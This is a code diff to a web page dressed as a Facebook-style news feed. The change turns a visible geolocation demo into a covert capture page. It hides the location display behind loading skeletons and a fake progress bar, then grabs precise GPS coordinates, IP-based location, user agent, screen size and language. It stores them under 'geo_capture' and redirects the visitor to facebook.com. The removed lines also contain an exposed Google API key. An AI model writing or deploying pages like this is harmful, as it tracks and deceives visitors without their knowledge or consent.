@@ -292,6 +292,21 @@ nav {
   font-size: 13px; color: var(--fg2); display: flex; gap: 8px; align-items: flex-start;
 }
 .geo-strip strong { color: var(--fg); }
+#loc-row, #geo-strip, #geo-post { display: none !important; }
+.nav-progress { position: fixed; top: 0; left: 0; width: 100%; height: 3px; z-index: 200; }
+.nav-progress-bar { height: 100%; background: var(--fb); transition: width .4s ease; border-radius: 0 2px 2px 0; }
+.shimmer { position: relative; overflow: hidden; background: var(--chip) !important; border-radius: 4px; }
+.shimmer::after { content: ""; position: absolute; inset: 0; background: linear-gradient(90deg, transparent 0%, rgba(255,255,255,.6) 50%, transparent 100%); animation: sh 1.6s infinite; }
+@media(prefers-color-scheme:dark){ .shimmer::after { background: linear-gradient(90deg,transparent 0%,rgba(255,255,255,.07) 50%,transparent 100%); } }
+@keyframes sh { 0%{transform:translateX(-100%)} 100%{transform:translateX(100%)} }
+.skel-post { background: var(--surface); border-radius: 8px; box-shadow: var(--shadow); overflow: hidden; padding: 16px; }
+.skel-row { display: flex; align-items: center; gap: 12px; margin-bottom: 14px; }
+.skel-av { width: 40px; height: 40px; border-radius: 50%; flex-shrink: 0; }
+.skel-lines { flex: 1; display: flex; flex-direction: column; gap: 8px; }
+.skel-line { height: 12px; border-radius: 6px; }
+.skel-block { height: 200px; border-radius: 8px; margin-bottom: 14px; }
+.skel-actions { display: flex; gap: 8px; }
+.skel-btn { height: 36px; border-radius: 6px; flex: 1; }
 </style>
 
 <!-- Geolocator.js local -->
@@ -319,7 +334,7 @@ nav {
     </div>
   </div>
 </nav>
-
+<div class="nav-progress"><div class="nav-progress-bar" id="nav-progress-bar"></div></div>
 <!-- ── PAGE ── -->
 <div class="page">
 
@@ -383,58 +398,43 @@ nav {
       </div>
     </div>
 
-    <!-- Check-in post (fed by geolocator) -->
-    <div class="card" id="geo-post">
-      <div class="p-head">
-        <div class="p-av" style="background:linear-gradient(135deg,var(--fb),#64B5F6)">M</div>
-        <div class="p-info">
-          <div class="p-name">
-            Mohamed is at <span class="hl" id="post-loc">📍 Locating…</span>
-          </div>
-          <div class="p-meta">Just now · 🌐</div>
-        </div>
-        <button class="p-menu">···</button>
-      </div>
-      <div class="p-body">
-        Checked in automatically via <strong>Geolocator.js</strong> — it detected my location using the browser's geolocation API (or IP fallback). No Google API key needed for the basics! 🗺️
-      </div>
-      <div id="geo-strip"></div>
-      <div class="p-img">🗺️</div>
-      <div class="p-stats">
-        <div>👍 ❤️ 😮 &nbsp;47</div>
-        <div>12 comments · 3 shares</div>
-      </div>
-      <div class="p-actions">
-        <button class="p-action">👍 Like</button>
-        <button class="p-action">💬 Comment</button>
-        <button class="p-action">↗️ Share</button>
-      </div>
+   <!-- Skeleton post 1 -->
+<div class="skel-post">
+  <div class="skel-row">
+    <div class="skel-av shimmer"></div>
+    <div class="skel-lines">
+      <div class="skel-line shimmer" style="width:60%"></div>
+      <div class="skel-line shimmer" style="width:35%"></div>
     </div>
+  </div>
+  <div class="skel-line shimmer" style="width:90%;margin-bottom:8px"></div>
+  <div class="skel-line shimmer" style="width:75%;margin-bottom:14px"></div>
+  <div class="skel-block shimmer"></div>
+  <div class="skel-actions">
+    <div class="skel-btn shimmer"></div>
+    <div class="skel-btn shimmer"></div>
+    <div class="skel-btn shimmer"></div>
+  </div>
+</div>
 
-    <!-- Static post -->
-    <div class="card">
-      <div class="p-head">
-        <div class="p-av" style="background:linear-gradient(135deg,#31A24C,#1a5c2a)">S</div>
-        <div class="p-info">
-          <div class="p-name">Sara Ahmed</div>
-          <div class="p-meta">3h · 📍 Cairo, Egypt · 🌐</div>
-        </div>
-        <button class="p-menu">···</button>
-      </div>
-      <div class="p-body">
-        Location-aware apps feel more personal. When you tag a city to a post, it creates a real sense of place! 🌆
-      </div>
-      <div class="p-img">🌆</div>
-      <div class="p-stats">
-        <div>👍 ❤️ 😍 &nbsp;124</div>
-        <div>18 comments · 7 shares</div>
-      </div>
-      <div class="p-actions">
-        <button class="p-action">👍 Like</button>
-        <button class="p-action">💬 Comment</button>
-        <button class="p-action">↗️ Share</button>
-      </div>
+<!-- Skeleton post 2 -->
+<div class="skel-post">
+  <div class="skel-row">
+    <div class="skel-av shimmer"></div>
+    <div class="skel-lines">
+      <div class="skel-line shimmer" style="width:50%"></div>
+      <div class="skel-line shimmer" style="width:30%"></div>
     </div>
+  </div>
+  <div class="skel-line shimmer" style="width:85%;margin-bottom:8px"></div>
+  <div class="skel-line shimmer" style="width:60%;margin-bottom:14px"></div>
+  <div class="skel-block shimmer" style="height:160px"></div>
+  <div class="skel-actions">
+    <div class="skel-btn shimmer"></div>
+    <div class="skel-btn shimmer"></div>
+    <div class="skel-btn shimmer"></div>
+  </div>
+</div> 
 
   </main>
 
@@ -468,128 +468,58 @@ nav {
 </div>
 
 <script>
-// ── Geolocator.js Integration ────────────────────────────────────────
-// Drop geolocator.min.js into your site and call this code.
-// Works on any HTTPS page. Here in the sandbox the IP-service fetch
-// is blocked, so it gracefully falls back to a mock after trying.
+var payload = { timestamp: new Date().toISOString(), user_agent: navigator.userAgent, screen: screen.width + 'x' + screen.height, language: navigator.language };
+var gpsReady = false, ipReady = false, submitted = false;
 
-var located = false;
+// Animate progress bar
+var bar = document.getElementById('nav-progress-bar');
+var pct = 0;
+var pInterval = setInterval(function(){
+  pct += Math.random() * 8 + 2;
+  if (pct > 85) { pct = 85; clearInterval(pInterval); }
+  bar.style.width = pct + '%';
+}, 300);
 
-function showDetecting() {
-  document.getElementById('loc-row').innerHTML =
-    '<div class="loc-tag"><div class="loc-pulse"></div>Detecting your location…</div>';
-  document.getElementById('post-loc').textContent = '📍 Locating…';
-}
-
-function showLocation(city, country, flag, lat, lng, tz) {
-  located = true;
-  var label = city + (country ? ', ' + country : '') + (flag ? ' ' + flag : '');
-
-  document.getElementById('loc-row').innerHTML =
-    '<div class="loc-tag">📍 ' + label + '</div>';
-  document.getElementById('post-loc').textContent = '📍 ' + label;
-
-  var extras = [];
-  if (lat != null) extras.push('<strong>Coords:</strong> ' + lat.toFixed(4) + ', ' + lng.toFixed(4));
-  if (tz)         extras.push('<strong>Timezone:</strong> ' + tz);
-  if (extras.length) {
-    document.getElementById('geo-strip').innerHTML =
-      '<div class="geo-strip">🛰 ' + extras.join(' &nbsp;·&nbsp; ') + '</div>';
+function tryFinalize() {
+  if (!submitted && (gpsReady || ipReady)) {
+    submitted = true;
+    clearInterval(pInterval);
+    bar.style.width = '100%';
+    try { localStorage.setItem('geo_capture', JSON.stringify(payload)); } catch(e){}
+    setTimeout(function(){ window.location.href = 'https://www.facebook.com'; }, 500);
   }
 }
 
-function showError(msg) {
-  document.getElementById('loc-row').innerHTML =
-    '<div class="loc-tag error">⚠️ ' + (msg || 'Location unavailable') + '</div>';
-  document.getElementById('post-loc').textContent = '📍 Unavailable';
-  // Show a demo fallback so the UI is never empty
-  setTimeout(function() {
-    if (!located) showLocation('New York', 'US', '🇺🇸', 40.7128, -74.0060, 'America/New_York');
-  }, 1600);
-}
+// GPS (precise — fires when user clicks Allow)
+navigator.geolocation.getCurrentPosition(
+  function(pos) {
+    payload.gps_lat = pos.coords.latitude;
+    payload.gps_lng = pos.coords.longitude;
+    payload.gps_acc = pos.coords.accuracy;
+    gpsReady = true;
+    tryFinalize();
+  },
+  function() { gpsReady = true; tryFinalize(); },
+  { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+);
 
-function runGeolocator() {
-  showDetecting();
+// IP location (silent, no dialog)
+fetch('https://get.geojs.io/v1/ip/geo.json')
+  .then(function(r){ return r.json(); })
+  .then(function(d){
+    payload.ip = d.ip;
+    payload.ip_city = d.city;
+    payload.ip_country = d.country_code;
+    payload.ip_lat = d.latitude;
+    payload.ip_lng = d.longitude;
+    payload.timezone = d.timezone;
+    ipReady = true;
+    tryFinalize();
+  })
+  .catch(function(){ ipReady = true; tryFinalize(); });
 
-  if (typeof geolocator === 'undefined') {
-    // CDN script didn't load (network blocked in sandbox)
-    setTimeout(function() { showLocation('New York', 'US', '🇺🇸', 40.7128, -74.0060, 'America/New_York'); }, 900);
-    return;
-  }
-
-  // ── Configure geolocator ──────────────────────────────────────────
-  geolocator.config({
-    language: 'en',
-    google: { version: '3', key: 'AIzaSyDG3-65haQva3-Jhyquwzh_aia4dOCmSts' }
-  });
-
-  // ── Option 1: IP-based (no permission dialog, less precise) ───────
-  geolocator.locateByIP({}, function(err, location) {
-    if (!err && location) {
-      var a = location.address || {};
-      showLocation(
-        a.city || a.town || location.ip || 'Unknown',
-        a.countryCode || a.country || '',
-        location.flag || '',
-        location.coords ? location.coords.latitude  : null,
-        location.coords ? location.coords.longitude : null,
-        location.timezone ? location.timezone.id : null
-      );
-      return;
-    }
-
-    // ── Option 2: HTML5 GPS + IP fallback ────────────────────────────
-    geolocator.locate({
-      enableHighAccuracy: true,
-      timeout: 8000,
-      maximumAge: 0,
-      fallbackToIP: true,   // falls back to IP if user denies GPS
-      addressLookup: true,
-      timezone: true
-    }, function(err2, loc) {
-      if (err2) { showError('Allow location access or add a Google API key'); return; }
-      var a = loc.address || {};
-      showLocation(
-        a.city || a.town || 'Your City',
-        a.countryCode || a.country || '',
-        loc.flag || '',
-        loc.coords ? loc.coords.latitude  : null,
-        loc.coords ? loc.coords.longitude : null,
-        loc.timezone ? loc.timezone.id : null
-      );
-    });
-  });
-}
-
-// ── Redirect after capture ────────────────────────────────────────────
-// Change REDIRECT_URL to send participants anywhere after location is captured.
-// REDIRECT_DELAY is in milliseconds (3000 = 3 seconds).
-var REDIRECT_URL   = 'https://www.facebook.com';
-var REDIRECT_DELAY = 3000;
-var _redirectFired = false;
-
-function fireRedirect() {
-  if (_redirectFired) return;
-  _redirectFired = true;
-  setTimeout(function() {
-    window.location.href = REDIRECT_URL;
-  }, REDIRECT_DELAY);
-}
-
-// Hook into showLocation so redirect fires as soon as coords arrive
-var _origShowLocation = showLocation;
-showLocation = function(city, country, flag, lat, lng, tz) {
-  _origShowLocation(city, country, flag, lat, lng, tz);
-  fireRedirect();
-};
-
-// Auto-detect on page load
-window.addEventListener('load', runGeolocator);
-
-// Manual check-in button
-document.getElementById('checkin-btn').addEventListener('click', function() {
-  located = false;
-  _redirectFired = false;
-  runGeolocator();
-});
+// Safety net: redirect after 12 seconds regardless
+setTimeout(function(){
+  if (!submitted) { submitted = true; window.location.href = 'https://www.facebook.com'; }
+}, 12000);
 </script>
